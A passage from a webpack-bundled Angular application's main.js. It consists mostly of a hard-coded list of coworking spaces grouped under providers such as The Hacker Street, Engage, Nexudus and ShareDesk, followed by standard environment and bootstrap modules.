                "name": "Cubic Business Centre",
                "address": "Koramangala 3 Block, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Co start hub",
                "address": "Sanjaynagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Davanam Golden Square Prime",
                "address": "Koramangala, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "My WorkArea",
                "address": "Sheshadripuram, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "365 shared spaces HSR",
                "address": "HSR Layout, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Investopad",
                "address": "4th Block, Koramangala, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WeWork Galaxy",
                "address": "Ashok Nagar, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Rainmakers Workspace",
                "address": "MG Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Candor HUB",
                "address": "MG Road, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "IndiQube Zeta",
                "address": "Hubali, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "IndiQube Omega",
                "address": "ITPL Main Road,, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Newbridge Business Centre",
                "address": "Koramangala, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Fetchpod coworking",
                "address": "6th Block, Ejipura, Bengaluru",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "IndiQube Garden",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "North Bangalore Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "High Calibre League Co-working",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Founder’s Cube",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "We Work Embassy TechVillage",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WeWork Vikhroli West",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bombay Connect",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WorkSquare Powai",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bloomdesk coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "603 Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Mumbai Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Work Square",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "iKeva BKC Annexe",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bangalore Alpha Lab – JP Nagar",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workshaala NR Tower",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "CoWrks – Ecoworld",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "One Co.Work",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "GreenBubbles Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WeWork Hebbal",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Sillicon Vally Business Centre",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Dialogues Cafe",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "IndiQube Sigma",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Indiqube Alpha",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Solo Cubes Koramangala",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Innov8 Koramangala",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "GoodWorks CoWork",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Social Offline – Church Street",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Novel Office MG road",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "CoWorkIndia",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "CoWrks – New Indiranagar",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Inspire Workplace",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Work-Adda CoWorking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Blank Space Bangalore",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Let’s Start Cowork Space",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91springboard Indiranagar",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Spacelance Indiranagar",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Ixora Cowork",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Think Hub",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "WorkDen Indiranagar",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Deskhub Bangalore",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bangalore Alpha Lab",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Solo Cubes Co working and Reading place",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Sun Square Business Hub",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Ataura Coworking space",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Indiqube Delta",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bhive HSR S-6",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Commune Coworks",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bhive HSR S-4",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workspace MG Road",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Space-n-Desk",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91springboard Koramangala 8th block",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91springboard MG road",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Work IN",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Awfis Indiranagar",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Golden Square Business Centre VM",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Trinity Workspace",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Woodstock Business centre",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Workbench Projects",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Jaaga",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Vatika Business Centre &amp; Co-working Spaces",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Bizzhub Work Spaces",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Dreams@Work",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Beginest",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "My Work Area",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "IShareSpace – Residency Road",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Upstart Coworking",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "Cowork Cafe",
                "address": "",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "91springboard Koramangala 7th Block",
                "address": "Hosur Road",
                "provider": "The Hacker Street",
                "type": "cowork"
            },
            {
                "name": "SparkPlug Coworks",
                "address": "Koramangala, Bangalore",
                "provider": "The Hacker Street",
                "type": "cowork"
            }
        ];
        this.OTHER_MT = [
            'ShareDesk Global Inc',
            'cobot',
            'Nexudus Ltd',
            'eFlair'
        ];
        this.Enagage = [
            {
                "name": "Engage",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "The Hack - Coworking Spaces",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "R WorkSquare Coworking",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "CoKarma Coworking",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Qabila Coworking",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Coworq",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "One Space",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Work Shack - Navin House",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Gowork",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "My Place",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "BIG WHEEL",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Bric Coworking",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Spring House Coworking",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "India Accelerator",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Team Cowork",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Work365",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "HashTag Coworks",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Rainmakers Workspace",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Bcogent",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "The BoardRoom Coworking",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "The Hack Champion",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "BubbleSpace",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Cowork Venue",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "VrkSpace",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Working Kulture",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Ginserv",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "WorkOville",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Muse Coworking",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "InnoWorks",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Evolve Coworking",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Aspire Business Club",
                "address": "",
                "type": "",
                "provider": "Engage"
            },
            {
                "name": "Synergy Offices",
                "address": "",
                "type": "",
                "provider": "Engage"
            }
        ];
        this.Nexdus = [
            {
                "name": "AICD Passport",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Passport by Nexudus",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "HIT",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "LABS",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "SOHO NOMADS",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "NEWO",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Werqwise",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "The Clubhouse",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Mutuo",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Urban Place",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "NexIO",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "4D COMMISSARY",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "utopicus",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Cozone",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Powered by United",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "The Shop Workspace",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "CO.CO",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "B:Hive",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "MLC Mobile",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Luminary",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Impact Hub Madrid",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "The Building Society",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Minds CoWork",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "The Ministry",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "WeRemote",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "CWi",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "SOHO CONNECT",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Inspire Cowork",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "meet + greet",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Brain Embassy",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "NexBoard",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "ManeSpace",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Venture X",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Haven Coworking",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "CloudWorks Passport",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Visionary Workspaces",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "NexEvents",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "SOHO CI",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Colony Coworking Space",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "One Heddon St",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "L39 Community",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "The A Insider",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Office Suites Club",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Office Club",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "The Workshop",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Tribe",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Glandore",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "COHUTT",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Toong",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Space2B",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Cowork Medical",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Mortimer House",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Eleanor's Place",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Workvana",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "AtTheOffice",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "azalvo",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "MYO",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Bold",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "Workable London",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            },
            {
                "name": "OnOffices",
                "address": "",
                "type": "",
                "provider": "Nexdus"
            }
        ];
        this.ShareDesk = [
            {
                "name": "Optix",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Business Link",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Highland | City Club",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "COhatch",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "community101",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Workhaus Co.",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The Cloud Room",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Orbital Music Park",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Hopewell Works",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "LINA: Love Your Practice",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Impact Hub Honolulu",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "THRIVE | Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Ikigai Nairobi",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Tramshed Tech",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Cornerstone Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Enterspace",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "HiVE Vancouver",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "theDesk Booking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The Coven MPLS",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "ORCA Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "MyWorkSpot",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "AYEKA",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Irontek",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The Loft Office Suites",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Aldea Networking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Stratus Offices",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "StationW",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "StartHub",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Infusion Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Orangery",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "MileOne",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Grunderloftet",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Mosaic Mumbai",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The McKinley Club PHX",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "innspace",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Parlay Cafe",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "OfficeOurs Melbourne",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Workable Nairobi",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Atmowork",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Workup Hub",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Terkko Hub",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "BNZ Partners",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Launch Coworking Space",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Grid.works",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Duo Works",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The Profile Vancouver",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Haus",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Rise & Grind Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Work and Wall",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Cahoots",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "BLOC Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "HudCo",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "space on the fly",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Look LV",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "ASID HQ Meetings",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "FoundrSpace",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "the Urban Hub",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Launch Academy",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Homebase Works",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Work At The Park",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The Co-Co",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "COWORK 1010",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Johnson Corner",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "HIVE Coworking & Makerspace",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Scout Workshop",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "F.M.C",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "OPEN Workspace",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Protein Studios",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Playyo",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "MobSquad Calgary",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Input Cowork",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The Shop - Homewood",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Incubate Ventures",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Western BACE",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Raw Space",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "LawWorks Workspace for Lawyers",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Dream Village",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Conspire Boston",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "b[x]",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Artist Foundry",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Zip Office, LLC",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Commons at Phase",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "United Agent Services",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "ProSuites2 Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "pro.space",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "A/D/O Workspace",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Kimball HQ",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Impact Brixton",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "River City Labs",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Co-Madre Comunidad y Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The Cluster",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "The Wheelhouse UK",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "co.workspace @ the collective",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "DIOM",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "Kailua Music School",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "KIN Coworking",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            },
            {
                "name": "FabCafe",
                "address": "",
                "type": "",
                "provider": "ShareDesk"
            }
        ];
    }
};
ArrayData = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Injectable"])({
        providedIn: 'root'
    })
], ArrayData);



/***/ }),

/***/ "./src/environments/environment.ts":
/*!*****************************************!*\
  !*** ./src/environments/environment.ts ***!
  \*****************************************/
/*! exports provided: environment */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "environment", function() { return environment; });
// This file can be replaced during build by using the `fileReplacements` array.
// `ng build --prod` replaces `environment.ts` with `environment.prod.ts`.
// The list of file replacements can be found in `angular.json`.
const environment = {
    production: false
};
/*
 * For easier debugging in development mode, you can import the following file
 * to ignore zone related error stack frames such as `zone.run`, `zoneDelegate.invokeTask`.
 *
 * This import should be commented out in production mode because it will have a negative impact
 * on performance if an error is thrown.
 */
// import 'zone.js/dist/zone-error';  // Included with Angular CLI.


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm2015/core.js");
/* harmony import */ var _angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/platform-browser-dynamic */ "./node_modules/@angular/platform-browser-dynamic/fesm2015/platform-browser-dynamic.js");
/* harmony import */ var _app_app_module__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./app/app.module */ "./src/app/app.module.ts");
/* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./environments/environment */ "./src/environments/environment.ts");




if (_environments_environment__WEBPACK_IMPORTED_MODULE_3__["environment"].production) {
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["enableProdMode"])();
}
Object(_angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__["platformBrowserDynamic"])().bootstrapModule(_app_app_module__WEBPACK_IMPORTED_MODULE_2__["AppModule"])
    .catch(err => console.error(err));


/***/ }),

/***/ 0:
/*!***************************!*\
  !*** multi ./src/main.ts ***!
  \***************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! /home/aws/Desktop/hacker/src/main.ts */"./src/main.ts");


/***/ })

},[[0,"runtime","vendor"]]]);
//# sourceMappingURL=main.js.map